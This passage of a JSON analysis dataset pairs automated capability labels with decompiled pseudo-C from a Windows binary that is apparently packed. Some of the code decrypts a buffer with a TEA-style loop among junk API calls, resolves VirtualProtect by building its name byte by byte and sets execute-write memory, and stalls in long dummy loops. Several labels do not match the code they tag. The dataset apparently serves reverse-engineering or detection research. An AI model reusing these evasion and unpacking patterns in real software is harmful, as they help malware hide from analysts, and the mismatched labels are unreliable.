= true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0040eb58:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x414cf4 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x0040ed6c:\n    var_20h = iVar12 << (0x1fU - *0x414cf4 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x414cf8 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x414cf8 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3651
    },
    "0040ef7d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040ef7d(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004073fa();\n    var_4h = 0;\n    if (*0x7ffd08 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x40358c);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x403580);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x7ffd08 = fcn.00407388(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x403570);\n        *0x7ffd0c = fcn.00407388(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x40355c);\n        *0x7ffd10 = fcn.00407388(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x403540);\n        *0x7ffd18 = fcn.00407388(uVar3);\n        if (*0x7ffd18 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x403528);\n            *0x7ffd14 = fcn.00407388(uVar3);\n        }\n    }\n    if ((*0x7ffd14 != iVar1) && (*0x7ffd18 != iVar1)) {\n        pcVar4 = fcn.00407403(*0x7ffd14);\n        pcVar5 = fcn.00407403(*0x7ffd18);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040f0bf;\n        }\n    }\n    if ((((*0x7ffd0c != iVar1) && (pcVar4 = fcn.00407403(*0x7ffd0c),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x7ffd10 != iVar1 && (pcVar4 = fcn.00407403(*0x7ffd10),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040f0bf:\n    pcVar4 = fcn.00407403(*0x7ffd08);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 820
    },
    "0040fa5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fa5d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41493c ^ &stack0xfffffffc;\n    fcn.00405ee2(arg_10h);\n    var_14h = fcn.004097b4(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e327(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040fab6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040faf6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040fae8:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040faf6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040fae8;\n        goto code_r0x0040fab6;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040faf6:\n    fcn.0040b029(unaff_EBX);\n    return;\n}\n",
        "token_count": 506
    },
    "0040fb05": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fb05(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x41493c ^ &stack0xfffffffc;\n    fcn.00405ee2(arg_10h);\n    var_14h = fcn.004097b4(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e86b(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040fb5e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fb9e;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040fb90:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040fb9e;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040fb90;\n        goto code_r0x0040fb5e;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040fb9e:\n    fcn.0040b029(unaff_EBX);\n    return;\n}\n",
        "token_count": 509
    },
    "00411168": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00411168(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x411213;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0041123f;\n        uStack36 = *0x41493c ^ &fcn.00411168::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00411168::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040764f();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00411168::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 718
    },
    "00411500": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411500(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00408f98(0x412530, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.0040764f();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040dc99();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.004120d0(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004115c6();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040dc99();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.00408fdd();\n    return;\n}\n",
        "token_count": 565
    },
    "004115c6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004115c6(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040764f();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040764f();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0041188e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041188e(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004113a6(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040764f();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040764f();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0041137f(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00411626(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00406167": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406167(uint32_t arg_8h)\n\n{\n    fcn.00406144();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040658a();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "0040678f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040678f(uint32_t arg_8h)\n\n{\n    fcn.0040677f();\n    if ((arg_8h & 1) != 0) {\n        fcn.0040658a();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00403ed0": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00403ed0(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uStack48;\n    int32_t iStack24;\n    uchar auStack8 [4];\n    uchar auStack4 [4];\n    \n    iVar3 = *0x41512c;\n    iVar2 = *0x415128;\n    uStack48 = *param_1;\n    uVar5 = param_1[1];\n    fcn.00403eb0();\n    iVar4 = *0x415130;\n    iStack24 = 0x23f;\n    iVar6 = 0x20;\n    do {\n        if (*0x820cd4 == 0xfa9) {\n            *0x820cd0 = 0xedeb2e40;\n        }\n        else if (*0x820cd4 == 0x3eb) {\n            (*_sym.imp.KERNEL32.dll_InterlockedExchange)(auStack8, 0);\n            *0x81f8ac = 0;\n        }\n        *0x820ccc = 0xf4ea3dee;\n        fcn.00403ec0();\n        uVar1 = uStack48 * 0x10 + iVar4 ^ uStack48 + iStack24;\n        if (*0x820cd4 == 0x213) {\n            (*_sym.imp.KERNEL32.dll_WriteConsoleInputW)(0, 0, 0, auStack4);\n        }\n        uVar5 = uVar5 - (uStack48 >> 5 ^ uVar1);\n        fcn.00403ea0();\n        uStack48 = uStack48 - (uVar1 + iVar2 ^ (uVar5 >> 5) + iVar3 ^ iStack24 + uVar5);\n        iStack24 = iStack24 + 0x61c88647;\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    param_1[1] = uVar5;\n    *param_1 = uStack48;\n    return;\n}\n",
        "token_count": 485
    },
    "00404080": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.00404080(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iStack2056;\n    uint32_t uStack2052;\n    \n    pcVar4 = _sym.imp.KERNEL32.dll_GetNumberFormatW;\n    pcVar3 = _sym.imp.KERNEL32.dll_OpenWaitableTimerA;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthW;\n    pcVar1 = _sym.imp.KERNEL32.dll_FatalAppExitW;\n    uStack2052 = *0x820cd4 >> 3;\n    if (uStack2052 != 0) {\n        iStack2056 = *0x81f8b0;\n        do {\n            if (*0x820cd4 == 0x959) {\n                (*pcVar1)(0, 0x403690);\n                (*pcVar4)(0, 0, 0x4036ec, 0, &iStack2056, 0);\n                (*pcVar3)(0, 0, 0x403720);\n                (*pcVar2)();\n            }\n            fcn.00403ed0();\n            iStack2056 = iStack2056 + -1;\n        } while (iStack2056 != 0);\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "00407dfe": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00407dfe(uint param_1, uint param_2, int32_t param_3, uint param_4)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    bool bVar8;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    unkbyte10 extraout_ST0;\n    float10 fVar9;\n    uchar in_XMM0 [16];\n    uint64_t uVar10;\n    uint unaff_retaddr;\n    \n    uVar1 = SUB162(in_XMM0 >> 0x30, 0);\n    uVar2 = (uVar1 & 0x7fff) + 0xcfd0;\n    bVar8 = uVar2 == 0x10c5;\n    if (uVar2 < 0x10c6) {\n        iVar7 = (ROUND(*0x401c20 * SUB168(in_XMM0, 0)) + 0x1c7610U & 0x3f) * 0x20;\n        return CONCAT44(iVar7, iVar7 + 0x4013e0);\n    }\n    if (uVar2 < 0x10c6) {\n        uVar4 = uVar1 & 0x7fff;\n        pinsrw(in_XMM0, uVar4, 3);\n        return CONCAT44(param_2, uVar4);\n    }\n    uVar10 = fcn.00408225();\n    uVar4 = uVar10 >> 0x20 & 0xffff0000 | in_FPUControlWord;\n    if (bVar8) {\n        if (((uVar10 & 0xfffff) == 0) && (param_3 == 0)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = fcn.0040820c();\n        }\n        if (*0x7ff5c0 == 0) {\n            uVar6 = fcn.00408387(uVar4, unaff_retaddr, param_3, param_4);\n            return CONCAT44(uVar4, uVar6);\n        }\n    }\n    else {\n        fVar9 = fcos(extraout_ST0);\n        uVar3 = uVar10 & 0xffff0000 | in_FPUStatusWord;\n        if ((in_FPUStatusWord & 0x400) != 0) {\n            do {\n                fVar9 = fVar9 - (fVar9 / *0x401caa) * *0x401caa;\n                uVar3 = uVar3 & 0xffff0000 | in_FPUStatusWord;\n            } while ((in_FPUStatusWord & 0x400) != 0);\n            fcos(fVar9);\n        }\n        if (*0x7ff5c0 == 0) {\n            uVar5 = uVar3 & 0xffff0000 | in_FPUControlWord;\n            if (in_FPUControlWord != 0x27f) {\n                if (((in_FPUControlWord & 0x20) != 0) &&\n                   (uVar5 = uVar3 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                    uVar6 = fcn.00408387(uVar4, unaff_retaddr, param_3, param_4);\n                    return CONCAT44(uVar4, uVar6);\n                }\n                uVar5 = uVar5 & 0xffff0020;\n            }\n            return CONCAT44(uVar4, uVar5);\n        }\n    }\n    return CONCAT44(uVar4, uVar3);\n}\n",
        "token_count": 845
    },
    "00408225": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00408225(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "00403eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403eb0(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 46
    },
    "00403ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403ec0(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "00404120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404120(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00404160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00404160(void)\n\n{\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0x40377c;\n    uStack16 = 0x40416e;\n    *0x81f8b4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack16 = 0x800108;\n    *0x800108 = 0x56;\n    *0x800109 = 0x69;\n    *0x80010a = 0x72;\n    *0x80010f = 0x50;\n    *0x800115 = 0x74;\n    *0x800116 = 0;\n    *0x80010b = 0x74;\n    *0x80010c = 0x75;\n    *0x80010d = 0x61;\n    *0x80010e = 0x6c;\n    *0x800110 = 0x72;\n    *0x800111 = 0x6f;\n    *0x800112 = 0x74;\n    *0x800113 = 0x65;\n    *0x800114 = 99;\n    *0x81f8a8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x81f8b4);\n    (**0x81f8a8)(*0x81f8b0, *0x820cd4, 0x40, &stack0xfffffff0);\n    return;\n}\n",
        "token_count": 336
    },
    "00404240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_6ch\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Variable defined which should be unmapped: lpSectorsPerCluster\n// WARNING: Variable defined which should be unmapped: lpBytesPerSector\n// WARNING: Variable defined which should be unmapped: phModule\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404240(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    char *pcVar8;\n    char *extraout_ECX;\n    int32_t extraout_EDX;\n    uint unaff_ESI;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar auStackY9028 [2048];\n    uint var_1b40h;\n    uint var_1740h;\n    uint lpString;\n    uint var_f40h;\n    uint lpsz;\n    uint lpConsoleTitle;\n    uint lpVersionInformation;\n    uint var_228h;\n    uint var_208h;\n    uint var_1f4h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint *var_6ch;\n    uint *var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint *var_5ch;\n    uint *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    uint *var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint lpBinaryType;\n    uint *lpTotalNumberOfClusters;\n    uint lpNumberOfFreeClusters;\n    uint phModule;\n    uint lpBytesPerSector;\n    int32_t lpSectorsPerCluster;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_ch = *in_FS_OFFSET;\n    var_4h = 0xffffffff;\n    uStack12 = 0x4121eb;\n    *in_FS_OFFSET = &fcn.00404240::var_ch;\n    lpSectorsPerCluster = 0x404262;\n    fcn.00410190();\n    pcVar3 = _sym.imp.USER32.dll_SetCaretPos;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetACP;\n    if (*0x820cd4 != 0x6a6) {\n        iVar9 = 0;\n        phModule = unaff_EDI;\n        lpBytesPerSector = unaff_ESI;\n        do {\n            if (iVar9 < 0x400) {\n                lpNumberOfFreeClusters = 0;\n                lpTotalNumberOfClusters = NULL;\n                lpBinaryType = 0x40439e;\n                (*pcVar3)();\n            }\n            lpNumberOfFreeClusters = 0x4043a0;\n            (*pcVar2)();\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0xe3a7);\n        *0x820cd4 = *0x820cd4 + 0xb2d3b;\n        lpNumberOfFreeClusters = 0x4043b9;\n        fcn.00404140();\n        lpNumberOfFreeClusters = 0x4043be;\n        fcn.00404160();\n        pcVar3 = _sym.imp.KERNEL32.dll_SetTapePosition;\n        pcVar2 = _sym.imp.KERNEL32.dll_GetMailslotInfo;\n        uVar10 = 0;\n        if (*0x820cd4 != 0) {\n            do {\n                lpNumberOfFreeClusters = 0;\n                lpTotalNumberOfClusters = &fcn.00404240::lpsz;\n                (*0x81f8b0)[uVar10] = *(*0x9de470 + 0xb2d3b + uVar10);\n                lpBinaryType = 0x404404;\n                (*_sym.imp.USER32.dll_CharLowerBuffA)();\n                if (*0x820cd4 == 0xa8) {\n                    lpNumberOfFreeClusters = 0;\n                    lpTotalNumberOfClusters = NULL;\n                    lpBinaryType = 0;\n                    var_28h = 0;\n                    var_2ch = NULL;\n                    var_30h = 